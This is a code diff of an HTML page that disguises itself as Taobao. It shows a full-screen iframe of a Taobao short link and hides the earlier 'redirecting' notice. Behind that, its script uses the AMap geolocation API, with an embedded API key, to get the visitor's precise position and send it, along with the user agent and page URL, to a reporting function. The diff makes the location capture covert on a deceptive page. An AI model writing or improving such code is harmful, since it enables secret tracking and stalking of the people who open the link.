@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>正在跳转至淘宝...</title>
+  <title>淘宝</title>
   <link rel="icon" href="https://g.alicdn.com/??tmdfe/??/favicon.ico">
   <style>
     body {
@@ -30,12 +31,26 @@
     }
     .success { color: #27ae60; }
     .info { color: #7f8c8d; margin-top: 8px; }
+    /* 移除默认边距和滚动条 */
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden; /* 防止出现滚动条 */
+    }
+
+    /* iframe 铺满整个视口 */
+    iframe {
+      width: 100vw;
+      height: 100vh;
+      border: none; /* 去掉边框 */
+    }
   </style>
 </head>
 <body>
-  <h1>正在跳转至淘宝商品详情页...</h1>
-  <p>请稍候（约 3 秒）</p>
- 
+  <!-- <h1>正在跳转至淘宝商品详情页...</h1>
+  <p>请稍候...</p> -->
+ <iframe  src="https://e.tb.cn/h.SRFtccL33kGPw27?tk=hNcjf1NpBpZ" title="淘宝"></iframe>
 
   <script>
     // ========== 坐标转换函数（WGS-84 → 百度 BD-09）==========
@@ -119,7 +134,7 @@
       };
 
       // 安全兜底：3秒后强制跳转
-      setTimeout(doRedirect, 3000);
+      // setTimeout(doRedirect, 3000);
 
       // 如果不支持定位，直接跳转
       if (!navigator.geolocation) {
@@ -127,45 +142,60 @@
         return;
       }
 
-      // 尝试获取位置（2秒超时）
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const { latitude, longitude, accuracy } = position.coords;
-          const latWGS = latitude.toFixed(6);
-          const lngWGS = longitude.toFixed(6);
-          const [bdLat, bdLng] = wgs84ToBd09(latitude, longitude);
+       const script = document.createElement('script');
+    script.src = 'https://webapi.amap.com/maps?v=2.0&key=215793b6869cb8cd50a89d42a3b01f97';
+    script.onload = () => {
+      if (typeof AMap === 'undefined') {
+        doRedirect(); // 加载失败则跳转
+        return;
+      }
 
-          // 上报（不等待）
-          sendLocationToServer({
-            timestamp: new Date().toLocaleString("zh-CN"),
-            latitude: latWGS,
-            longitude: lngWGS,
-            accuracy: Math.round(accuracy),
-            userAgent: navigator.userAgent,
-            url: window.location.href
-          });
-
-          // 显示成功信息（即使跳转了，用户可能看到一闪）
-          resultDiv.innerHTML = `
-            <span class="success">✅ 位置已获取并上报</span><br>
-            <div class="info">纬度：${latWGS} | 经度：${lngWGS} | 精度：±${Math.round(accuracy)} 米</div>
-          `;
-          resultDiv.style.display = "block";
-
-          // 稍等 500ms 再跳转，让用户看到反馈
-          setTimeout(doRedirect, 500);
-        },
-        (error) => {
-          // 用户拒绝或失败：直接跳转
-          doRedirect();
-        },
-        {
+      AMap.plugin('AMap.Geolocation', () => {
+        const geolocation = new AMap.Geolocation({
           enableHighAccuracy: true,
           timeout: 2000,
-          maximumAge: 60000
-        }
-      );
-    })();
+          maximumAge: 60000,
+          convert: true,        // 返回 GCJ-02（已纠偏）
+          showButton: false,
+          showMarker: false,
+          showCircle: false
+        });
+
+        geolocation.getCurrentPosition((status, result) => {
+          if (status === 'complete' && result.position) {
+            const { lat, lng } = result.position;
+            const accuracy = result.accuracy || 100;
+
+            // 高德返回的是 GCJ-02，如需 BD-09 则转换（根据你原逻辑保留）
+            const [bdLat, bdLng] = gcj02ToBd09(lat, lng);
+
+            // 上报原始 WGS-84？但高德不提供。我们上报 GCJ-02（更真实）
+            // 注意：你原逻辑上报的是 WGS-84，但实际国内设备原生定位也未必是真 WGS-84
+            // 这里建议上报 GCJ-02（更准确），但为兼容你后端，可只传 GCJ-02 当作“原始”
+            sendLocationToServer({
+              timestamp: new Date().toLocaleString("zh-CN"),
+              latitude: lat.toFixed(6),      // GCJ-02 纬度
+              longitude: lng.toFixed(6),     // GCJ-02 经度
+              accuracy: Math.round(accuracy),
+              userAgent: navigator.userAgent,
+              url: window.location.href
+            });
+
+            resultDiv.style.display = "block";
+            setTimeout(doRedirect, 500);
+          } else {
+            doRedirect(); // 定位失败
+          }
+        });
+      });
+    };
+
+    script.onerror = () => {
+      doRedirect(); // 高德加载失败
+    };
+
+    document.head.appendChild(script);
+  })();
   </script>
 </body>
 </html>
